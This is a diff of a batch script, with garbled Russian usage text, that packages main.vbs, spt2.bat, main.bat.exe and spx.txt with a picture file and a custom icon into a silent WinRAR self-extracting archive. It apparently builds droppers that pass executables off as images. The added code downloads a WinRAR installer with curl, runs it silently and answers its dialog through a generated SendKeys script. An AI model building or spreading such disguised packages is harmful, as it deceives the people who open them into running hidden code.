@@ -1,6 +1,4 @@
 @echo on
-set curldir=D:\Users\tonnyr2\curl-7.75.0-win32-mingw\bin
-rem windows  10 1607 corporative 32 bit
 IF [%1]==[] (
 	goto :usage
 )
@@ -69,10 +67,27 @@ if not EXIST "%iconFail%" (
 )
 )
 
-
-
 :rar
+if exist "%ProgramFiles%\"WinRar\WinRAR.exe (
 "%ProgramFiles%\"WinRar\WinRAR.exe a -sfxdefault.sfx "%SfXFileName%" main.vbs spt2.bat main.bat.exe spx.txt "%KartinkaFail%" -zsfxcomment.txt -iicon"%iconFail%" -IBCK 
+goto :dl
+) 
+if exist WinRar.exe (
+	WinRAR.exe a -sfxdefault.sfx "%SfXFileName%" main.vbs spt2.bat main.bat.exe spx.txt "%KartinkaFail%" -zsfxcomment.txt -iicon"%iconFail%" -IBCK 
+) else (
+curl https://www.rarlab.com/rar/wrar601b1.exe -o wrarsetup.exe
+echo set oShell = WScript.CreateObject^("WScript.Shell"^) >mysh.vbs
+echo oShell.SendKeys^("%CD%"^) >>mysh.vbs
+echo WScript.Sleep 50 >>mysh.vbs
+echo oShell.SendKeys^("{ENTER}"^) >>mysh.vbs
+start /MIN rasinvkr.bat "wrarsetup.exe /S"
+timeout /T 2
+cscript mysh.vbs
+del mysh.vbs
+timeout /T 5
+WinRAR.exe a -sfxdefault.sfx "%SfXFileName%" main.vbs spt2.bat main.bat.exe spx.txt "%KartinkaFail%" -zsfxcomment.txt -iicon"%iconFail%" -IBCK
+)
+:dl
 del %lockfile%
 :rep
 if EXIST "%SfXFileName%" (
@@ -84,6 +99,6 @@ goto :rep
 REM "%ProgramFiles%\"WinRar\Rar.exe a -sfxdefault.sfx %SfXFileName% sfxconstructror2.vbs main.vbs spt2.bat main.bat.exe spx.txt %myscriptname% "%KartinkaFail%" -zsfxcomment.txt -iicon%iconFail%
 goto :ed
 :usage
-	echo 	%0 ^<??¬'ï  àå?¢ã> ^<ä ©« ª àâ¨­ª¨>
+	echo 	%0 ^<??Ð¼'Ñ Ð°Ñ€Ñ…?Ð²Ñƒ> ^<Ñ„Ð°Ð¹Ð» ÐºÐ°Ñ€Ñ‚Ð¸Ð½ÐºÐ¸>
 
 :ed
